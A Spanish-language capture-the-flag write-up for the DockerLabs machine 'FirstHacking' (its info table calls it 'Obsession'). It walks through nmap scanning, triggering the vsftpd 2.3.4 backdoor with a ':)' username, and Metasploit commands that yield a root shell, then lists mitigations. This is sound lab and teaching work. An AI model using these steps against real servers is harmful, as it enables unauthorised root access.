# 🛡️ Writeup – FirstHacking (DockerLabs)

Este documento detalla el proceso de resolución del desafío **FirstHacking** en DockerLabs, desde el reconocimiento inicial hasta la obtención de acceso **root**. La metodología empleada sigue la cadena clásica de pentesting:

**Reconocimiento → Enumeración → Acceso inicial → Escalada de privilegios → Root**

## 1️⃣ Información General

| Campo           | Información   |
|---------------: |:-------------|
| **Nombre**      | Obsession    |
| **Dificultad**  | Muy Fácil    |
| **IP objetivo** | 172.17.0.2   |
| **Plataforma**  | DockerLabs   |

### 🎯 Objetivo

- Enumerar servicios y puertos
- Identificar vulnerabilidades explotables
- Conseguir acceso inicial
- Escalar privilegios a root

---

## 2️⃣ Reconocimiento y Enumeración

### Escaneo Nmap

```bash
nmap -sC -sV -oN escaneoInicial.txt 172.17.0.2
```

Resultado clave:
- 21/tcp open ftp vsftpd 2.3.4

---

## 3️⃣ Explotación de VSFTPD 2.3.4 (backdoor)

La versión `vsftpd 2.3.4` es vulnerable a un backdoor de autenticación agregada por el autor malicioso:
- usuario contiene `:)`
- contraseña cualquier valor

### Validación manual (opcional)

```bash
ftp 172.17.0.2
# name: test:)
# password: test
```

> En esta prueba no se obtiene shell directamente, pero confirma el comportamiento del backdoor.

### Uso de Metasploit

1. Ejecutar msfconsole

```bash
msfconsole
```

2. Buscar módulo

```bash
search exploit vsftpd
```

3. Seleccionar módulo

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

4. Configurar objetivo

```bash
set RHOSTS 172.17.0.2
```

5. Ejecutar exploit

```bash
exploit
```

---

## 4️⃣ Obtención de acceso

Con éxito del exploit, se obtiene shell con privilegios de root.

```bash
whoami
root
```

---

## 5️⃣ Conclusiones

- La máquina era intencionadamente vulnerable (vsftpd 2.3.4 con backdoor conocido).
- El ataque es directo: reconocimiento + exploit específico.
- El ejercicio demuestra la importancia de mantener servicios actualizados y evitar versiones comprometidas.

---

## 6️⃣ Recomendaciones de mitigación

- Actualizar vsftpd a una versión segura actual.
- Implementar monitorización de acceso FTP y análisis de logs.
- Deshabilitar servicios innecesarios o restringir con firewall.
